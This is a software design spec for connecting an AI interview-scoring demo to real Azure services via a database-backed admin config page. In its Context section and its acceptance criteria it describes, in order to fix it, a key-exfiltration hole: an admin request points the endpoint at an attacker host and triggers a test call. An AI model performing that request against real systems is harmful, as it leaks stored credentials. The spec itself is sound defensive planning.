# Spec: Real-Azure integration via DB-backed config page (Phase 1)

**Status:** Draft for review (authored via `/spec`, 2026-08-10)
**Branch context:** stacked on `feat/db-service-config` (which stacked on `feat/playwright-e2e-ci`, PR #17)
**Spec of record:** [`../../SPEC.md`](../../SPEC.md) · this doc scopes the config/real-Azure work only

---

## Context

The app was built so every AI capability runs on **mock** providers for dev/CI (zero Azure). The
demo's whole value is the *real* closed loop: upload SOP → AI question bank + rubric →
digital-human interview → SOP-cited scored report, all on the customer's own Azure. The user
verified this session that they want to test/accept against **real Azure resources, never mocks**.

Today that path is broken in three ways, all verified this session:

1. **Config comes only from `.env` + hardcoded defaults, and the var names don't match.** The
   project reads `FOUNDRY_PROJECT_ENDPOINT` / `DEFAULT_AGENT_SYNC_PROVIDER` / `DEFAULT_VOICE_PROVIDER`,
   but a typical `.env` (AI-Coach-shaped) sets `AZURE_FOUNDRY_ENDPOINT` and leaves the providers at
   `mock`. Result: `default_agent_sync_provider='mock'`, `foundry_project_endpoint=''` → the Foundry
   agent adapter never even registers (`registry.py:51` early-returns on empty endpoint). `config.py`'s
   own docstring claims "DB-backed ServiceConfig is the source of truth" but **that table was only
   half-built** (v0.15 added a master row + overlay, but no model/KB API pull, no real LLM).
2. **No real LLM adapter exists.** `_LLM_ADAPTERS = {"mock": ...}` only (`registry.py:20`). Scoring
   and "Draft from SOP" are mock-only regardless of config — a "scored" report on real Azure is
   still fake numbers.
3. **Model / knowledge base / knowledge source must be hand-typed and hand-matched** to variable
   names. The user's Foundry project already has these configured; they're retrievable from the
   Foundry API (AI-Coach does exactly this).

Plus a **P1 security hole** found in the v0.15 pre-landing review: `config_service.upsert_master_config`
(`config_service.py:70`) sets `endpoint` unconditionally while an empty `api_key` preserves the stored
key. A holder of the admin token can `PUT {endpoint: attacker.com, api_key: ""}` then `POST /test`,
exfiltrating the real decrypted Azure key to an attacker host. Defeats the "key is write-only,
encrypted at rest" guarantee.

**Intended outcome:** An operator fills the AI Foundry endpoint + key + project in `/admin`, picks a
deployed model and a Foundry IQ knowledge base from **dropdowns populated by the Foundry API**, saves,
and — with no restart and no `.env` editing — the interviewer agent conversation, LLM scoring, and
SOP-cited retrieval all run against real Azure. Config precedence stays **DB > .env > code default**.

## Current State (verified 2026-08-10, this session)

| Capability | Real-Azure adapter exists? | Wired to config? | Gap |
|---|---|---|---|
| Foundry agent-sync (F5) | ✅ `azure_agent_sync.py` (Entra-first, API-key fallback) | Registered only if `foundry_project_endpoint` set | Provider defaults to mock; endpoint field unset |
| Voice Live (F9) | ✅ `voice_broker.py` | Reads `azure_foundry_*` at request time | Provider defaults to mock (out of Phase 1 scope) |
| SOP retrieval / Foundry IQ (F1) | ✅ `azure_retrieval.py` (httpx + api-key, `/knowledgebases/{kb}/retrieve?api-version=2026-05-01-preview`) | Registered only if `azure_search_*` all set | kb/ks hand-typed; provider mock |
| LLM scoring + checklist draft (F3/F4) | ❌ **none** — `{"mock"}` only | n/a | Must build `AzureLLMAdapter` |
| DB master config + overlay | ✅ v0.15 (`config_service.py`, `config_overlay.py`) | Overlay flips voice + agent-sync providers | No LLM/retrieval in overlay; no API pull; P1 hole |

**Auth patterns already in the repo to reuse (do not reinvent):**
- `azure_agent_sync.py:208-238` `_project_client()` — Entra (`DefaultAzureCredential`, scope
  `https://ai.azure.com/.default`) first, `AzureKeyCredential` + `_ApiKeyTokenCredential` fallback.
  Sync SDK dispatched via `asyncio.to_thread`.
- `azure_retrieval.py:60-95` — `httpx.AsyncClient`, `api-key` header, direct REST.

**LLM adapter contract (from `base.py:15-27`, only consumer methods):**
- `name: str`; `async complete(prompt, *, json_mode=False) -> str` (returns a JSON **string** when
  `json_mode=True`; callers `json.loads` it). `stream()` exists but has **no caller in `app/`** — skip.
- Call sites: `checklist_service.py:98` and `scoring_service.py:103,107` — both `await
  llm.complete(prompt, json_mode=True)`, both accept an optional `llm_provider` kwarg.

**AI-Coach reference API shapes (verified, for the dropdowns):**
- Model deployments: `GET {endpoint}/api/projects/{project}/deployments?api-version=v1` (header
  `api-key`), response `data`/`value` list of `{name, modelName}`; legacy fallback
  `GET {endpoint}/openai/deployments?api-version=2024-10-21` → `{data:[{id,model}]}`.
- Foundry IQ knowledge bases: `GET {endpoint}/knowledgebases?api-version=2026-05-01-preview`
  (api-key first, Entra `https://search.azure.com/.default` fallback on 401/403), response
  `{value:[{name,version,type,description}]}`.

## Proposed Change (Phase 1)

One coherent "real-Azure config" capability. Six workstreams:

### A. Fix the P1 (mandatory, first)
- **Endpoint allowlist.** In `config_service.upsert_master_config` and the `/test` handler, validate
  `endpoint` is `https` and its host ends with an Azure suffix (`.services.ai.azure.com`,
  `.openai.azure.com`, `.cognitiveservices.azure.com`, `.search.windows.net`). Reject others with 422.
  Kills both the key-exfil path and the metadata-IP SSRF path.
- **Fail-closed encryption.** In `app/utils/encryption.py`, when `ENCRYPTION_KEY` is unset AND
  `settings.debug` is false, raise on encrypt/decrypt instead of deriving a key from `secret_key`.
  Dev (debug=true) keeps the derived-key convenience.

### B. `AzureLLMAdapter` (real scoring + checklist draft)
- New `app/services/agents/adapters/azure_llm.py`: `class AzureLLMAdapter(LLMAdapter)`, `name="azure"`.
  `complete(prompt, *, json_mode=False)` calls Azure OpenAI chat completions on the configured
  `deployment`; when `json_mode`, request `response_format={"type":"json_object"}` and return the raw
  content string. Auth: API-key first (`AsyncAzureOpenAI(azure_endpoint, api_key, api_version)`), Entra
  fallback via `azure_ad_token_provider` (scope `https://cognitiveservices.azure.com/.default`) —
  mirror `azure_agent_sync`'s dual pattern. `api-version` pinned `2024-06-01` (matches SPEC §3).
- `_register_azure_llm()` in `registry.py`, guarded on endpoint+deployment present; called from
  `refresh_azure_adapters()`.

### C. Config overlay covers LLM + retrieval
- In `config_overlay.py`, also set `settings.default_llm_provider="azure"`,
  `settings.default_retrieval_provider="azure"`, and overlay the Azure OpenAI + Foundry IQ fields
  (`azure_openai_endpoint/deployment`, `azure_search_endpoint/index/knowledge_source`) from the master
  row so the LLM + retrieval adapters register with DB values.

### D. Model + knowledge-base dropdowns (pull from Foundry API)
- New endpoints on the admin config router:
  - `GET /admin/config/ai-foundry/model-deployments` → project-scoped deployments API, legacy fallback,
    DB fallback (port AI-Coach `list_model_deployments`).
  - `GET /admin/config/ai-foundry/knowledge-bases` → `/knowledgebases` list (port AI-Coach
    `_get_knowledgebases`, api-key→Entra fallback).
- Both use the saved master config, both admin-gated, both fail-soft (return `[]` + message on error,
  never 500).

### E. Config model + save carries the new fields
- Extend `ServiceConfig` (or reuse existing columns) to persist: model/deployment (exists),
  `knowledge_base` name, `knowledge_source` name. Migration for the new columns.
- `PUT /admin/config/ai-foundry` accepts + persists them; overlay reads them.

### F. Frontend config panel = dropdowns
- `AdminPage.tsx` Azure panel: after endpoint+key+project saved (or "Load options" click), call the two
  new GET endpoints, render model + knowledge-base as `<select>` dropdowns (Fluent), plus knowledge-
  source. Save writes them. API-key stays write-only/masked.

## Acceptance Criteria (Phase 1)

All against a **real Foundry project** (`avarda-demo-prj` on the user's resource):

1. Admin opens `/admin` → Azure panel, enters endpoint + key + project, saves. GET returns the config
   with a **masked** key; the raw key never appears in any response body.
2. **P1 closed:** `PUT {endpoint: "https://attacker.example.com", api_key: ""}` returns **422**
   (non-Azure host rejected); the stored key is never sent anywhere but an allowlisted Azure host.
3. **Fail-closed:** with `debug=false` and no `ENCRYPTION_KEY`, the app refuses to encrypt/decrypt a
   key (documented startup error) instead of using a derivable key.
4. Model dropdown lists the resource's **real deployed models** (from the Foundry deployments API); the
   user picks `gpt-5.4-mini`. Knowledge-base dropdown lists the resource's **real Foundry IQ KBs**.
5. A candidate interview run (text) against the saved config: the interviewer agent conversation is
   served by the **real Foundry agent** (persisted agent id, real turns), not the mock.
6. The scored report uses **real LLM judgments** (AzureLLMAdapter), and at least one SOP citation
   (`【n:n†source】`-style) comes back from **real Foundry IQ retrieval**.
7. No restart needed: saving in the panel re-registers the azure adapters live.
8. All existing tests still pass on mocks (backend ≥85% cov, frontend, E2E). New unit tests cover the
   endpoint allowlist, fail-closed encryption, the LLM adapter's `complete`/json_mode, and the two
   dropdown endpoints (mocked httpx).

## Testing Plan

| Layer | What | Count |
|---|---|---|
| Unit | endpoint allowlist (accept Azure host, reject attacker/metadata IP); fail-closed encryption (debug on/off × key set/unset); `AzureLLMAdapter.complete` json_mode shape (mocked client); model-deployments + knowledge-bases endpoints (mocked httpx: success, 403→Entra fallback, error→[]) | +10 |
| Integration | overlay sets llm+retrieval providers + registers azure adapters after save (existing overlay test extended); `/test` rejects non-Azure endpoint | +3 |
| Live-Azure (manual, Layer 3) | AC #4-6 against `avarda-demo-prj` — dropdowns populate, agent conversation real, scored report cites real SOP | checklist |

## Rollback Plan
- Feature is additive + config-gated. Revert the branch → app falls back to mock providers (dev/CI
  unaffected, they never set the master row). The migration's `downgrade()` drops the new columns.

## Out of Scope (Phase 1 — locked with user,防漂移)
- **Multi-resource / per-service multi-row config** (AI-Coach's per-service toggle rows). One master row.
- **External secret-store backend.** Fernet-in-DB only.
- **Region auto-detect / region capabilities.**
- **Full voice WebRTC live audio round-trip** (mic-in / avatar-out in a real browser) — needs hardware;
  Voice Live provider flip can ride along but the live audio validation is deferred.
- Streaming interviewer turns (`LLMAdapter.stream` — no caller today).

## Files Reference

| File | Change |
|---|---|
| `backend/app/services/config_service.py:70` | Endpoint allowlist validation; persist kb/ks |
| `backend/app/utils/encryption.py` | Fail-closed when debug=false and no ENCRYPTION_KEY |
| `backend/app/services/agents/adapters/azure_llm.py` | **New** — AzureLLMAdapter |
| `backend/app/services/agents/registry.py` | `_register_azure_llm()`; call in `refresh_azure_adapters()` |
| `backend/app/services/config_overlay.py` | Overlay LLM + retrieval fields/providers |
| `backend/app/api/admin_config.py` | model-deployments + knowledge-bases GET endpoints; allowlist in PUT/test |
| `backend/app/models/service_config.py` + migration | kb/ks columns |
| `frontend/src/pages/AdminPage.tsx`, `src/api/admin.ts` | dropdowns from the two new endpoints |
| tests: `test_config_service.py`, `test_admin_config_api.py`, new `test_azure_llm.py` | coverage above |

## Related
- Reference impl: `AI-Coach-vibe-coding` `azure_config.py` (`list_model_deployments`), `knowledge_base_service.py` (`_get_knowledgebases`), `azure_auth.py` (Entra/key fallback).
- Builds on v0.15 (`feat/db-service-config`): `ServiceConfig` master row + `config_overlay`.
- Later phases: Voice Live provider flip + live audio validation; multi-resource config.
